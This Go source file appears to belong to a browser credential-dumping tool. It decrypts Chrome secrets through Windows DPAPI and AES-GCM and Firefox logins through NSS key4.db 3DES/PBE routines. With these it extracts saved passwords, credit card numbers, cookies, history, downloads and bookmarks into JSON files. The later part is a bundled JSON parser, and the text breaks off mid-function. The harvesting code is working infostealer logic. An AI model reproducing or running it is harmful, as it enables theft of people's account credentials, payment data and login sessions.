package core

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/des"
	"crypto/hmac"
	"crypto/sha1"
	"crypto/sha256"
	"database/sql"
	"encoding/asn1"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/sys/windows/registry"
	"io/ioutil"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unicode/utf16"
	"unicode/utf8"
	"unsafe"
)

func (c *Chromium) InitSecretKey() error {
	if c.keyPath == "" {
		return nil
	}
	if _, err := os.Stat(c.keyPath); os.IsNotExist(err) {
		return fmt.Errorf("%s secret key path is empty", c.name)
	}
	keyFile, err := ReadFile(c.keyPath)
	if err != nil {
		return err
	}
	encryptedKey := Get(keyFile, "os_crypt.encrypted_key")
	if encryptedKey.Exists() {
		pureKey, err := base64.StdEncoding.DecodeString(encryptedKey.String())
		if err != nil {
			return err
		}
		c.secretKey, err = DPApi(pureKey[5:])
		return err
	}
	return err
}

func NewChromium(profile, key, name, storage string) Browser {
	return &Chromium{profilePath: profile, keyPath: key, name: name, storage: storage}
}

func (c *Chromium) GetName() string {
	return c.name
}

func (c *Chromium) GetSecretKey() []byte {
	return c.secretKey
}

func (c *Chromium) GetAllItems() ([]Item, error) {
	var items []Item
	for _, choice := range chromiumItems {
		m, err := getItemPath(c.profilePath, choice.mainFile)
		if err != nil {
			continue
		}
		i := choice.newItem(m, "")
		items = append(items, i)
	}
	return items, nil
}

func (c *Chromium) GetItem(itemName string) (Item, error) {
	itemName = strings.ToLower(itemName)
	if item, ok := chromiumItems[itemName]; ok {
		m, _ := getItemPath(c.profilePath, item.mainFile)
		i := item.newItem(m, "")
		return i, nil
	} else {
		return nil, nil
	}
}

func NewFirefox(profile, key, name, storage string) Browser {
	return &Firefox{profilePath: profile, keyPath: key, name: name}
}

func (f *Firefox) GetAllItems() ([]Item, error) {
	var items []Item
	for _, choice := range firefoxItems {
		var (
			sub, main string
			err       error
		)
		if choice.subFile != "" {
			sub, err = getItemPath(f.profilePath, choice.subFile)
			if err != nil {
				continue
			}
		}
		main, err = getItemPath(f.profilePath, choice.mainFile)
		if err != nil {
			continue
		}
		i := choice.newItem(main, sub)
		items = append(items, i)
	}
	return items, nil
}

func (f *Firefox) GetItem(itemName string) (Item, error) {
	itemName = strings.ToLower(itemName)
	if item, ok := firefoxItems[itemName]; ok {
		var (
			sub, main string
		)
		if item.subFile != "" {
			sub, _ = getItemPath(f.profilePath, item.subFile)
		}
		main, _ = getItemPath(f.profilePath, item.mainFile)
		i := item.newItem(main, sub)
		return i, nil
	} else {
		return nil, nil
	}
}

func (f *Firefox) GetName() string {
	return f.name
}

func (f *Firefox) GetSecretKey() []byte {
	return nil
}

func (f *Firefox) InitSecretKey() error {
	return nil
}

func PickBrowser(name string) []Browser {
	var browsers []Browser
	name = strings.ToLower(name)
	if name == "all" {
		for _, v := range browserList {
			b := v.New(v.ProfilePath, v.KeyPath, v.Name, v.Storage)
			browsers = append(browsers, b)
		}
		return browsers
	} else if choice, ok := browserList[name]; ok {
		b := choice.New(choice.ProfilePath, choice.KeyPath, choice.Name, choice.Storage)
		browsers = append(browsers, b)
		return browsers
	}
	return nil
}

func getItemPath(profilePath, file string) (string, error) {
	p, err := filepath.Glob(filepath.Join(profilePath, file))
	if err != nil {
		return "", err
	}
	if len(p) > 0 {
		return p[0], nil
	}
	return "", fmt.Errorf("find %s failed", file)
}

func ChromePass(key, encryptPass []byte) []byte {
	if len(encryptPass) > 15 {
		// remove Prefix 'v10'
		return aesGCMDecrypt(encryptPass[15:], key, encryptPass[3:15])
	} else {
		return nil
	}
}

func aesGCMDecrypt(crypted, key, nounce []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil
	}
	blockMode, err := cipher.NewGCM(block)
	if err != nil {
		return nil
	}
	origData, err := blockMode.Open(nil, nounce, crypted, nil)
	if err != nil {
		return nil
	}
	return origData
}

func NewBlob(d []byte) *dataBlob {
	if len(d) == 0 {
		return &dataBlob{}
	}
	return &dataBlob{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *dataBlob) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func DPApi(data []byte) ([]byte, error) {
	dllCrypt := syscall.NewLazyDLL("Crypt32.dll")
	dllKernel := syscall.NewLazyDLL("Kernel32.dll")
	procDecryptData := dllCrypt.NewProc("CryptUnprotectData")
	procLocalFree := dllKernel.NewProc("LocalFree")
	var outBlob dataBlob
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outBlob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))
	return outBlob.ToByteArray(), nil
}

func (m MetaPBE) Decrypt(globalSalt, masterPwd []byte) (key2 []byte, err error) {
	k := sha1.Sum(globalSalt)
	key := pbkdf2Key(k[:], m.EntrySalt, m.IterationCount, m.KeySize, sha256.New)
	iv := append([]byte{4, 14}, m.IV...)
	return aes128CBCDecrypt(key, iv, m.Encrypted)
}

func aes128CBCDecrypt(key, iv, encryptPass []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	dst := make([]byte, len(encryptPass))
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(dst, encryptPass)
	dst = PKCS5UnPadding(dst)
	return dst, nil
}

func PKCS5UnPadding(src []byte) []byte {
	length := len(src)
	unpad := int(src[length-1])
	return src[:(length - unpad)]
}

func des3Decrypt(key, iv []byte, src []byte) ([]byte, error) {
	block, err := des.NewTripleDESCipher(key)
	if err != nil {
		return nil, err
	}
	blockMode := cipher.NewCBCDecrypter(block, iv)
	sq := make([]byte, len(src))
	blockMode.CryptBlocks(sq, src)
	return sq, nil
}

func PaddingZero(s []byte, l int) []byte {
	h := l - len(s)
	if h <= 0 {
		return s
	} else {
		for i := len(s); i < l; i++ {
			s = append(s, 0)
		}
		return s
	}
}

type ASN1PBE interface {
	Decrypt(globalSalt, masterPwd []byte) (key []byte, err error)
}

func NewASN1PBE(b []byte) (pbe ASN1PBE) {
	var (
		n NssPBE
		m MetaPBE
		l LoginPBE
	)
	if _, err := asn1.Unmarshal(b, &n); err == nil {
		return n
	}
	if _, err := asn1.Unmarshal(b, &m); err == nil {
		return m
	}
	if _, err := asn1.Unmarshal(b, &l); err == nil {
		return l
	}
	return nil
}

func (n NssPBE) Decrypt(globalSalt, masterPwd []byte) (key []byte, err error) {
	glmp := append(globalSalt, masterPwd...)
	hp := sha1.Sum(glmp)
	s := append(hp[:], n.EntrySalt...)
	chp := sha1.Sum(s)
	pes := PaddingZero(n.EntrySalt, 20)
	tk := hmac.New(sha1.New, chp[:])
	tk.Write(pes)
	pes = append(pes, n.EntrySalt...)
	k1 := hmac.New(sha1.New, chp[:])
	k1.Write(pes)
	tkPlus := append(tk.Sum(nil), n.EntrySalt...)
	k2 := hmac.New(sha1.New, chp[:])
	k2.Write(tkPlus)
	k := append(k1.Sum(nil), k2.Sum(nil)...)
	iv := k[len(k)-8:]
	return des3Decrypt(k[:24], iv, n.Encrypted)
}

func (l LoginPBE) Decrypt(globalSalt, masterPwd []byte) (key []byte, err error) {
	return des3Decrypt(globalSalt, l.IV, l.Encrypted)
}

func (p passwords) Len() int {
	return len(p.logins)
}

func (p passwords) Less(i, j int) bool {
	return p.logins[i].CreateDate.After(p.logins[j].CreateDate)
}

func (p passwords) Swap(i, j int) {
	p.logins[i], p.logins[j] = p.logins[j], p.logins[i]
}

func (d downloads) Len() int {
	return len(d.downloads)
}

func (d downloads) Less(i, j int) bool {
	return d.downloads[i].StartTime.After(d.downloads[j].StartTime)
}

func (d downloads) Swap(i, j int) {
	d.downloads[i], d.downloads[j] = d.downloads[j], d.downloads[i]
}

func copyToLocalPath(src, dst string) error {
	locals, _ := filepath.Glob("*")
	for _, v := range locals {
		if v == dst {
			err := os.Remove(dst)
			if err != nil {
				return err
			}
		}
	}
	sourceFile, err := ioutil.ReadFile(src)
	if err != nil {
	}
	err = ioutil.WriteFile(dst, sourceFile, 0777)
	if err != nil {
	}
	return err
}

func NewFPasswords(main, sub string) Item {
	return &passwords{mainPath: main, subPath: sub}
}

func NewCPasswords(main, sub string) Item {
	return &passwords{mainPath: main}
}

func (p *passwords) ChromeParse(key []byte) error {
	loginDB, err := sql.Open("sqlite3", ChromePasswordFile)
	if err != nil {
		return err
	}
	defer func() {
		if err := loginDB.Close(); err != nil {
		}
	}()
	rows, err := loginDB.Query(queryChromiumLogin)
	if err != nil {
		return err
	}
	defer func() {
		if err := rows.Close(); err != nil {
		}
	}()
	for rows.Next() {
		var (
			url, username string
			pwd, password []byte
			create        int64
		)
		_ = rows.Scan(&url, &username, &pwd, &create)
		login := loginData{
			UserName:    username,
			encryptPass: pwd,
			LoginUrl:    url,
		}
		if key == nil {
			password, err = DPApi(pwd)
		} else {
			password = ChromePass(key, pwd)
		}
		if create > time.Now().Unix() {
			login.CreateDate = TimeEpochFormat(create)
		} else {
			login.CreateDate = TimeStampFormat(create)
		}
		login.Password = string(password)
		p.logins = append(p.logins, login)
	}
	return nil
}

func (p *passwords) FirefoxParse() error {
	globalSalt, metaBytes, nssA11, nssA102, err := getFirefoxDecryptKey()
	if err != nil {
		return err
	}
	keyLin := []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}
	metaPBE := NewASN1PBE(metaBytes)
	if err != nil {
		return err
	}
	// default master password is empty
	var masterPwd []byte
	k, err := metaPBE.Decrypt(globalSalt, masterPwd)
	if err != nil {
		return err
	}
	if bytes.Contains(k, []byte("password-check")) {
		m := bytes.Compare(nssA102, keyLin)
		if m == 0 {
			nssPBE := NewASN1PBE(nssA11)
			if err != nil {
				return err
			}
			finallyKey, err := nssPBE.Decrypt(globalSalt, masterPwd)
			finallyKey = finallyKey[:24]
			if err != nil {
				return err
			}
			allLogins, err := getFirefoxLoginData()
			if err != nil {
				return err
			}
			for _, v := range allLogins {
				userPBE := NewASN1PBE(v.encryptUser)
				pwdPBE := NewASN1PBE(v.encryptPass)
				user, _ := userPBE.Decrypt(finallyKey, masterPwd)
				pwd, _ := pwdPBE.Decrypt(finallyKey, masterPwd)
				p.logins = append(p.logins, loginData{
					LoginUrl:   v.LoginUrl,
					UserName:   string(PKCS5UnPadding(user)),
					Password:   string(PKCS5UnPadding(pwd)),
					CreateDate: v.CreateDate,
				})
			}
		}
	}
	return nil
}

func (p *passwords) CopyDB() error {
	err := copyToLocalPath(p.mainPath, filepath.Base(p.mainPath))
	if p.subPath != "" {
		err = copyToLocalPath(p.subPath, filepath.Base(p.subPath))
	}
	return err
}

func (p *passwords) Release() error {
	err := os.Remove(filepath.Base(p.mainPath))
	if p.subPath != "" {
		err = os.Remove(filepath.Base(p.subPath))
	}
	return err
}

func (p *passwords) OutPut(format, browser, dir string) error {
	sort.Sort(p)
	switch format {
	case "console":
		return nil
	default:
		err := p.outPutJson(browser, dir)
		return err
	}
}

func NewCCards(main string, sub string) Item {
	return &creditCards{mainPath: main}
}

func (c *creditCards) FirefoxParse() error {
	return nil
}

func (c *creditCards) ChromeParse(secretKey []byte) error {
	c.cards = make(map[string][]card)
	creditDB, err := sql.Open("sqlite3", ChromeCreditFile)
	if err != nil {
		return err
	}
	defer func() {
		if err := creditDB.Close(); err != nil {
		}
	}()
	rows, err := creditDB.Query(queryChromiumCredit)
	if err != nil {
		return err
	}
	defer func() {
		if err := rows.Close(); err != nil {
		}
	}()
	for rows.Next() {
		var (
			name, month, year, guid string
			value, encryptValue     []byte
		)
		_ = rows.Scan(&guid, &name, &month, &year, &encryptValue)
		creditCardInfo := card{
			GUID:            guid,
			Name:            name,
			ExpirationMonth: month,
			ExpirationYear:  year,
		}
		if secretKey == nil {
			value, err = DPApi(encryptValue)
		} else {
			value = ChromePass(secretKey, encryptValue)
		}
		creditCardInfo.CardNumber = string(value)
		c.cards[guid] = append(c.cards[guid], creditCardInfo)
	}
	return nil
}

func (c *creditCards) CopyDB() error {
	return copyToLocalPath(c.mainPath, filepath.Base(c.mainPath))
}

func (c *creditCards) Release() error {
	return os.Remove(filepath.Base(c.mainPath))
}

func (c *creditCards) OutPut(format, browser, dir string) error {
	switch format {
	case "console":
		return nil
	default:
		err := c.outPutJson(browser, dir)
		return err
	}
}

func getFirefoxDecryptKey() (item1, item2, a11, a102 []byte, err error) {
	var (
		keyDB   *sql.DB
		pwdRows *sql.Rows
		nssRows *sql.Rows
	)
	keyDB, err = sql.Open("sqlite3", FirefoxKey4File)
	if err != nil {
		return nil, nil, nil, nil, err
	}
	defer func() {
		if err := keyDB.Close(); err != nil {
		}
	}()

	pwdRows, err = keyDB.Query(queryMetaData)
	defer func() {
		if err := pwdRows.Close(); err != nil {
		}
	}()
	for pwdRows.Next() {
		if err := pwdRows.Scan(&item1, &item2); err != nil {
			continue
		}
	}
	if err != nil {
	}
	nssRows, err = keyDB.Query(queryNssPrivate)
	defer func() {
		if err := nssRows.Close(); err != nil {
		}
	}()
	for nssRows.Next() {
		if err := nssRows.Scan(&a11, &a102); err != nil {
		}
	}
	return item1, item2, a11, a102, nil
}

func getFirefoxLoginData() (l []loginData, err error) {
	s, err := ioutil.ReadFile(FirefoxLoginFile)
	if err != nil {
		return nil, err
	}
	h := GetBytes(s, "logins")
	if h.Exists() {
		for _, v := range h.Array() {
			var (
				m loginData
				u []byte
				p []byte
			)
			m.LoginUrl = v.Get("formSubmitURL").String()
			u, err = base64.StdEncoding.DecodeString(v.Get("encryptedUsername").String())
			m.encryptUser = u
			if err != nil {
			}
			p, err = base64.StdEncoding.DecodeString(v.Get("encryptedPassword").String())
			m.encryptPass = p
			m.CreateDate = TimeStampFormat(v.Get("timeCreated").Int() / 1000)
			l = append(l, m)
		}
	}
	return
}

func NewDownloads(main, sub string) Item {
	return &downloads{mainPath: main}
}

func (d *downloads) ChromeParse(key []byte) error {
	historyDB, err := sql.Open("sqlite3", ChromeDownloadFile)
	if err != nil {
		return err
	}
	defer func() {
		if err := historyDB.Close(); err != nil {
		}
	}()
	rows, err := historyDB.Query(queryChromiumDownload)
	if err != nil {
		return err
	}
	defer func() {
		if err := rows.Close(); err != nil {
		}
	}()
	for rows.Next() {
		var (
			targetPath, tabUrl, mimeType   string
			totalBytes, startTime, endTime int64
		)
		_ = rows.Scan(&targetPath, &tabUrl, &totalBytes, &startTime, &endTime, &mimeType)
		data := download2{
			TargetPath: targetPath,
			Url:        tabUrl,
			TotalBytes: totalBytes,
			StartTime:  TimeEpochFormat(startTime),
			EndTime:    TimeEpochFormat(endTime),
			MimeType:   mimeType,
		}
		d.downloads = append(d.downloads, data)
	}
	return nil
}

func (d *downloads) FirefoxParse() error {
	var (
		err          error
		keyDB        *sql.DB
		downloadRows *sql.Rows
		tempMap      map[int64]string
	)
	tempMap = make(map[int64]string)
	keyDB, err = sql.Open("sqlite3", FirefoxDataFile)
	if err != nil {
		return err
	}
	_, err = keyDB.Exec(closeJournalMode)
	defer func() {
		if err := keyDB.Close(); err != nil {
		}
	}()
	downloadRows, err = keyDB.Query(queryFirefoxDownload)
	if err != nil {
		return err
	}
	defer func() {
		if err := downloadRows.Close(); err != nil {
		}
	}()
	for downloadRows.Next() {
		var (
			content, url       string
			placeID, dateAdded int64
		)
		_ = downloadRows.Scan(&placeID, &content, &url, &dateAdded)
		contentList := strings.Split(content, ",{")
		if len(contentList) > 1 {
			path := contentList[0]
			json := "{" + contentList[1]
			endTime := Get(json, "endTime")
			fileSize := Get(json, "fileSize")
			d.downloads = append(d.downloads, download2{
				TargetPath: path,
				Url:        url,
				TotalBytes: fileSize.Int(),
				StartTime:  TimeStampFormat(dateAdded / 1000000),
				EndTime:    TimeStampFormat(endTime.Int() / 1000),
			})
		}
		tempMap[placeID] = url
	}
	return nil
}

func (d *downloads) CopyDB() error {
	return copyToLocalPath(d.mainPath, filepath.Base(d.mainPath))
}

func (d *downloads) Release() error {
	return os.Remove(filepath.Base(d.mainPath))
}

func (d *downloads) OutPut(format, browser, dir string) error {
	switch format {
	case "console":
		return nil
	default:
		err := d.outPutJson(browser, dir)
		return err
	}
}

func NewHistoryData(main, sub string) Item {
	return &historyData{mainPath: main}
}

func (h *historyData) ChromeParse(key []byte) error {
	historyDB, err := sql.Open("sqlite3", ChromeHistoryFile)
	if err != nil {
		return err
	}
	defer func() {
		if err := historyDB.Close(); err != nil {
		}
	}()
	rows, err := historyDB.Query(queryChromiumHistory)
	if err != nil {
		return err
	}
	defer func() {
		if err := rows.Close(); err != nil {
		}
	}()
	for rows.Next() {
		var (
			url, title    string
			visitCount    int
			lastVisitTime int64
		)
		err := rows.Scan(&url, &title, &visitCount, &lastVisitTime)
		data := history2{
			Url:           url,
			Title:         title,
			VisitCount:    visitCount,
			LastVisitTime: TimeEpochFormat(lastVisitTime),
		}
		if err != nil {
		}
		h.history = append(h.history, data)
	}
	return nil
}

func (h *historyData) FirefoxParse() error {
	var (
		err         error
		keyDB       *sql.DB
		historyRows *sql.Rows
		tempMap     map[int64]string
	)
	tempMap = make(map[int64]string)
	keyDB, err = sql.Open("sqlite3", FirefoxDataFile)
	if err != nil {
		return err
	}
	_, err = keyDB.Exec(closeJournalMode)
	if err != nil {
	}
	defer func() {
		if err := keyDB.Close(); err != nil {
		}
	}()
	historyRows, err = keyDB.Query(queryFirefoxHistory)
	if err != nil {
		return err
	}
	defer func() {
		if err := historyRows.Close(); err != nil {
		}
	}()
	for historyRows.Next() {
		var (
			id, visitDate int64
			url, title    string
			visitCount    int
		)
		_ = historyRows.Scan(&id, &url, &visitDate, &title, &visitCount)
		h.history = append(h.history, history2{
			Title:         title,
			Url:           url,
			VisitCount:    visitCount,
			LastVisitTime: TimeStampFormat(visitDate / 1000000),
		})
		tempMap[id] = url
	}
	return nil
}

func (h *historyData) CopyDB() error {
	return copyToLocalPath(h.mainPath, filepath.Base(h.mainPath))
}

func (h *historyData) Release() error {
	return os.Remove(filepath.Base(h.mainPath))
}

func (h *historyData) OutPut(format, browser, dir string) error {
	sort.Slice(h.history, func(i, j int) bool {
		return h.history[i].VisitCount > h.history[j].VisitCount
	})
	switch format {
	case "console":
		return nil
	default:
		err := h.outPutJson(browser, dir)
		return err
	}
}

func NewCookies(main, sub string) Item {
	return &cookies{mainPath: main}
}

func (c *cookies) ChromeParse(secretKey []byte) error {
	c.cookies = make(map[string][]cookie2)
	cookieDB, err := sql.Open("sqlite3", ChromeCookieFile)
	if err != nil {
		return err
	}
	defer func() {
		if err := cookieDB.Close(); err != nil {
		}
	}()
	rows, err := cookieDB.Query(queryChromiumCookie)
	if err != nil {
		return err
	}
	defer func() {
		if err := rows.Close(); err != nil {
		}
	}()
	for rows.Next() {
		var (
			key, host, path                               string
			isSecure, isHTTPOnly, hasExpire, isPersistent int
			createDate, expireDate                        int64
			value, encryptValue                           []byte
		)
		_ = rows.Scan(&key, &encryptValue, &host, &path, &createDate, &expireDate, &isSecure, &isHTTPOnly, &hasExpire, &isPersistent)
		cookie := cookie2{
			KeyName:      key,
			Host:         host,
			Path:         path,
			encryptValue: encryptValue,
			IsSecure:     IntToBool(isSecure),
			IsHTTPOnly:   IntToBool(isHTTPOnly),
			HasExpire:    IntToBool(hasExpire),
			IsPersistent: IntToBool(isPersistent),
			CreateDate:   TimeEpochFormat(createDate),
			ExpireDate:   TimeEpochFormat(expireDate),
		}
		// remove 'v10'
		if secretKey == nil {
			value, err = DPApi(encryptValue)
		} else {
			value = ChromePass(secretKey, encryptValue)
		}
		cookie.Value = string(value)
		c.cookies[host] = append(c.cookies[host], cookie)
	}
	return nil
}

func (c *cookies) FirefoxParse() error {
	c.cookies = make(map[string][]cookie2)
	cookieDB, err := sql.Open("sqlite3", FirefoxCookieFile)
	if err != nil {
		return err
	}
	defer func() {
		if err := cookieDB.Close(); err != nil {
		}
	}()
	rows, err := cookieDB.Query(queryFirefoxCookie)
	if err != nil {
		return err
	}
	defer func() {
		if err := rows.Close(); err != nil {
		}
	}()
	for rows.Next() {
		var (
			name, value, host, path string
			isSecure, isHttpOnly    int
			creationTime, expiry    int64
		)
		_ = rows.Scan(&name, &value, &host, &path, &creationTime, &expiry, &isSecure, &isHttpOnly)
		c.cookies[host] = append(c.cookies[host], cookie2{
			KeyName:    name,
			Host:       host,
			Path:       path,
			IsSecure:   IntToBool(isSecure),
			IsHTTPOnly: IntToBool(isHttpOnly),
			CreateDate: TimeStampFormat(creationTime / 1000000),
			ExpireDate: TimeStampFormat(expiry),
			Value:      value,
		})
	}
	return nil
}

func (c *cookies) CopyDB() error {
	return copyToLocalPath(c.mainPath, filepath.Base(c.mainPath))
}

func (c *cookies) Release() error {
	return os.Remove(filepath.Base(c.mainPath))
}

func (c *cookies) OutPut(format, browser, dir string) error {
	switch format {
	case "console":
		return nil
	default:
		err := c.outPutJson(browser, dir)
		return err
	}
}

func NewBookmarks(main, sub string) Item {
	return &bookmarks{mainPath: main}
}

func (b *bookmarks) ChromeParse(key []byte) error {
	bookmarks, err := ReadFile(ChromeBookmarkFile)
	if err != nil {
		return err
	}
	r := Parse(bookmarks)
	if r.Exists() {
		roots := r.Get("roots")
		roots.ForEach(func(key, value Result) bool {
			getBookmarkChildren(value, b)
			return true
		})
	}
	return nil
}

func getBookmarkChildren(value Result, b *bookmarks) (children Result) {
	nodeType := value.Get(bookmarkType)
	bm := bookmark2{
		ID:        value.Get(bookmarkID).Int(),
		Name:      value.Get(bookmarkName).String(),
		URL:       value.Get(bookmarkUrl).String(),
		DateAdded: TimeEpochFormat(value.Get(bookmarkAdded).Int()),
	}
	children = value.Get(bookmarkChildren)
	if nodeType.Exists() {
		bm.Type = nodeType.String()
		b.bookmarks = append(b.bookmarks, bm)
		if children.Exists() && children.IsArray() {
			for _, v := range children.Array() {
				children = getBookmarkChildren(v, b)
			}
		}
	}
	return children
}

func (b *bookmarks) FirefoxParse() error {
	var (
		err          error
		keyDB        *sql.DB
		bookmarkRows *sql.Rows
		tempMap      map[int64]string
		bookmarkUrl  string
	)
	keyDB, err = sql.Open("sqlite3", FirefoxDataFile)
	if err != nil {
		return err
	}
	defer func() {
		if err := keyDB.Close(); err != nil {
		}
	}()
	_, _ = keyDB.Exec(closeJournalMode)
	bookmarkRows, err = keyDB.Query(queryFirefoxBookMarks)
	if err != nil {
		return err
	}
	for bookmarkRows.Next() {
		var (
			id, bType, dateAdded int64
			title, url           string
		)
		_ = bookmarkRows.Scan(&id, &url, &bType, &dateAdded, &title)
		if url, ok := tempMap[id]; ok {
			bookmarkUrl = url
		}
		b.bookmarks = append(b.bookmarks, bookmark2{
			ID:        id,
			Name:      title,
			Type:      BookMarkType(bType),
			URL:       bookmarkUrl,
			DateAdded: TimeStampFormat(dateAdded / 1000000),
		})
	}
	return nil
}

func (b *bookmarks) CopyDB() error {
	return copyToLocalPath(b.mainPath, filepath.Base(b.mainPath))
}

func (b *bookmarks) Release() error {
	return os.Remove(filepath.Base(b.mainPath))
}

func (b *bookmarks) OutPut(format, browser, dir string) error {
	sort.Slice(b.bookmarks, func(i, j int) bool {
		return b.bookmarks[i].ID < b.bookmarks[j].ID
	})
	switch format {
	case "console":
		return nil
	default:
		err := b.outPutJson(browser, dir)
		return err
	}
}

func (b *bookmarks) outPutJson(browser, dir string) error {
	filename := FormatFileName(dir, browser, "bookmark", "json")
	sort.Slice(b.bookmarks, func(i, j int) bool {
		return b.bookmarks[i].ID < b.bookmarks[j].ID
	})
	err := writeToJson(filename, b.bookmarks)
	if err != nil {
		return err
	}
	return nil
}

func (h *historyData) outPutJson(browser, dir string) error {
	filename := FormatFileName(dir, browser, "history", "json")
	sort.Slice(h.history, func(i, j int) bool {
		return h.history[i].VisitCount > h.history[j].VisitCount
	})
	err := writeToJson(filename, h.history)
	if err != nil {
		return err
	}
	return nil
}

func (d *downloads) outPutJson(browser, dir string) error {
	filename := FormatFileName(dir, browser, "download", "json")
	err := writeToJson(filename, d.downloads)
	if err != nil {
		return err
	}
	return nil
}

func (p *passwords) outPutJson(browser, dir string) error {
	PasswordCount = len(p.logins)
	filename := FormatFileName(dir, browser, "password", "json")
	err := writeToJson(filename, p.logins)
	if err != nil {
		return err
	}
	return nil
}

func (c *cookies) outPutJson(browser, dir string) error {
	CookieCount = len(c.cookies)
	filename := FormatFileName(dir, browser, "cookie", "json")
	err := writeToJson(filename, c.cookies)
	if err != nil {
		return err
	}
	return nil
}

func (c *creditCards) outPutJson(browser, dir string) error {
	CCCount = len(c.cards)
	filename := FormatFileName(dir, browser, "credit", "json")
	err := writeToJson(filename, c.cards)
	if err != nil {
		return err
	}
	return nil
}

func writeToJson(filename string, data interface{}) error {
	f, err := os.OpenFile(filename, os.O_RDWR|os.O_CREATE|os.O_TRUNC|os.O_APPEND, 0644)
	if err != nil {
		return err
	}
	defer f.Close()
	w := new(bytes.Buffer)
	enc := json.NewEncoder(w)
	enc.SetEscapeHTML(false)
	enc.SetIndent("", "\t")
	err = enc.Encode(data)
	if err != nil {
		return err
	}
	_, err = f.Write(w.Bytes())
	if err != nil {
		return err
	}
	return nil
}

func (t Type) String() string {
	switch t {
	default:
		return ""
	case Null:
		return "Null"
	case False:
		return "False"
	case Number:
		return "Number"
	case String:
		return "String"
	case True:
		return "True"
	case JSON:
		return "JSON"
	}
}

func (t Result) String() string {
	switch t.Type {
	default:
		return ""
	case False:
		return "false"
	case Number:
		if len(t.Raw) == 0 {
			return strconv.FormatFloat(t.Num, 'f', -1, 64)
		}
		var i int
		if t.Raw[0] == '-' {
			i++
		}
		for ; i < len(t.Raw); i++ {
			if t.Raw[i] < '0' || t.Raw[i] > '9' {
				return strconv.FormatFloat(t.Num, 'f', -1, 64)
			}
		}
		return t.Raw
	case String:
		return t.Str
	case JSON:
		return t.Raw
	case True:
		return "true"
	}
}

func (t Result) Bool() bool {
	switch t.Type {
	default:
		return false
	case True:
		return true
	case String:
		b, _ := strconv.ParseBool(strings.ToLower(t.Str))
		return b
	case Number:
		return t.Num != 0
	}
}

func (t Result) Int() int64 {
	switch t.Type {
	default:
		return 0
	case True:
		return 1
	case String:
		n, _ := parseInt(t.Str)
		return n
	case Number:
		i, ok := safeInt(t.Num)
		if ok {
			return i
		}
		i, ok = parseInt(t.Raw)
		if ok {
			return i
		}
		return int64(t.Num)
	}
}

func (t Result) Uint() uint64 {
	switch t.Type {
	default:
		return 0
	case True:
		return 1
	case String:
		n, _ := parseUint(t.Str)
		return n
	case Number:
		i, ok := safeInt(t.Num)
		if ok && i >= 0 {
			return uint64(i)
		}
		u, ok := parseUint(t.Raw)
		if ok {
			return u
		}
		return uint64(t.Num)
	}
}

func (t Result) Float() float64 {
	switch t.Type {
	default:
		return 0
	case True:
		return 1
	case String:
		n, _ := strconv.ParseFloat(t.Str, 64)
		return n
	case Number:
		return t.Num
	}
}

func (t Result) Time() time.Time {
	res, _ := time.Parse(time.RFC3339, t.String())
	return res
}

func (t Result) Array() []Result {
	if t.Type == Null {
		return []Result{}
	}
	if t.Type != JSON {
		return []Result{t}
	}
	r := t.arrayOrMap('[', false)
	return r.a
}

func (t Result) IsObject() bool {
	return t.Type == JSON && len(t.Raw) > 0 && t.Raw[0] == '{'
}

func (t Result) IsArray() bool {
	return t.Type == JSON && len(t.Raw) > 0 && t.Raw[0] == '['
}

func (t Result) ForEach(iterator func(key, value Result) bool) {
	if !t.Exists() {
		return
	}
	if t.Type != JSON {
		iterator(Result{}, t)
		return
	}
	json := t.Raw
	var keys bool
	var i int
	var key, value Result
	for ; i < len(json); i++ {
		if json[i] == '{' {
			i++
			key.Type = String
			keys = true
			break
		} else if json[i] == '[' {
			i++
			break
		}
		if json[i] > ' ' {
			return
		}
	}
	var str string
	var vesc bool
	var ok bool
	for ; i < len(json); i++ {
		if keys {
			if json[i] != '"' {
				continue
			}
			s := i
			i, str, vesc, ok = parseString(json, i+1)
			if !ok {
				return
			}
			if vesc {
				key.Str = unescape(str[1 : len(str)-1])
			} else {
				key.Str = str[1 : len(str)-1]
			}
			key.Raw = str
			key.Index = s
		}
		for ; i < len(json); i++ {
			if json[i] <= ' ' || json[i] == ',' || json[i] == ':' {
				continue
			}
			break
		}
		s := i
		i, value, ok = parseAny(json, i, true)
		if !ok {
			return
		}
		value.Index = s
		if !iterator(key, value) {
			return
		}
	}
}

func (t Result) Map() map[string]Result {
	if t.Type != JSON {
		return map[string]Result{}
	}
	r := t.arrayOrMap('{', false)
	return r.o
}

func (t Result) Get(path string) Result {
	return Get(t.Raw, path)
}

type arrayOrMapResult struct {
	a  []Result
	ai []interface{}
	o  map[string]Result
	oi map[string]interface{}
	vc byte
}

func (t Result) arrayOrMap(vc byte, valueize bool) (r arrayOrMapResult) {
	var json = t.Raw
	var i int
	var value Result
	var count int
	var key Result
	if vc == 0 {
		for ; i < len(json); i++ {
			if json[i] == '{' || json[i] == '[' {
				r.vc = json[i]
				i++
				break
			}
			if json[i] > ' ' {
				goto end
			}
		}
	} else {
		for ; i < len(json); i++ {
			if json[i] == vc {
				i++
				break
			}
			if json[i] > ' ' {
				goto end
			}
		}
		r.vc = vc
	}
	if r.vc == '{' {
		if valueize {
			r.oi = make(map[string]interface{})
		} else {
			r.o = make(map[string]Result)
		}
	} else {
		if valueize {
			r.ai = make([]interface{}, 0)
		} else {
			r.a = make([]Result, 0)
		}
	}
	for ; i < len(json); i++ {
		if json[i] <= ' ' {
			continue
		}
		// get next value
		if json[i] == ']' || json[i] == '}' {
			break
		}
		switch json[i] {
		default:
